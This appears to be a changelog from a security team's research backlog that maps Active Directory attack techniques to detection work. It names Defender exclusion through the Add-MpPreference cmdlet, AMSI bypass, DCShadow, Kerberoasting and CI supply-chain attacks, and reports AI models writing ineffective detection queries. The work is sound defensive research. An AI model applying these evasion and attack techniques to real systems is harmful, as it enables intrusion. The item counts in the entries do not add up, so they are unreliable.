 *Last updated: 2026-06-24 (session 12) — Added item #108 Defender Exclusion via PowerShell (T1562.001) — Detect FYI by Alex Teixeira 2026-06-24. Side-by-side AI vs human KQL test: ChatGPT (GPT-5.5) errored, Claude (Sonnet 4.6) had 9/12 false-negatives, human 15-line query caught 12/12. **KQL patterns port to Elastic:** `arg_max(Timestamp, *)` → `top_hits`, `dcount(DeviceId)` for prevalence (NOT `count()`), `parse_json(AdditionalFields)["X"]` → `JsonProperty(winlog.event_data.X)`. **Meta-finding for CADRE-Strike + DFIR-Nexus:** AI generates "syntactically correct, semantically plausible-looking queries that are completely useless in practice" — use AI to review/improve human queries, not generate from scratch. Runtime `Add-MpPreference -ExclusionPath` as Phase 3 attack primitive; persistence via Group Policy as Phase 5. Counts: 97 → 98 items (24 ✅ / 55 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 12 🆕). Tier 3: 32 → 33.*
 
 *Last updated: 2026-06-24 (session 11) — Added item #107 GitHub Actions Supply-Chain Attack Patterns (GMO Flatt Security blog Part 1, Sato 2026-06-24). Maps to Plan 0.8 expansion (F-11 cache poisoning + F-12 tag pollution analog) + Track H (CADRE-Strike defensive guardrails from cline incident). 3 attack patterns: vulnerable trigger injection (Ultralytics, nx), tag pollution + Imposter Commits (tj-actions, trivy), AI agent over-permissioning (cline — uses `anthropics/claude-code-action`). NOT in main AD spine. Counts: 96 → 97 items (24 ✅ / 54 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 12 🆕).*
+
+*Last updated: 2026-06-25 (session 13) — **ebooks survey** of `CADRE-Courses/ebooks/` (75 .txt files). Survey methodology: term-frequency analysis for AD attack vocabulary + DFIR/detection keywords. **Findings:** 11 books identified as Tier 1+2 high-value new content (not duplicates of existing sources). 3 concrete techniques extracted as Items #109-111: **AMSI Bypass** (Gray Hat Hacking 6th Ed, 4 mentions — no other source covers), **DCShadow** (Applied Incident Response + Practical-Red-Teaming, 5+ mentions — inverse of DCSync), **Rubeus/Kerberoast/AS-REP cross-validation** (Practical-Red-Teaming + Gray Hat Hacking). **4 study refs as Items #112-115:** Practical AI Security (2025), Cyber Threat Hunting, Practical Threat Detection Engineering, Windows Internals Part 1 7th Ed. Tier 3 + skip list documented (programming/theory/compliance/wrong-domain). Items 109-111 add 3 new Phase 3/7 attack primitives + plan1.7 detection candidates. Counts: 98 → 102 items (24 ✅ / 59 ⏳ / 4 🔬 / 1 ⏭️ / 2 ref / 12 🆕). Tier 3: 33 → 40.*
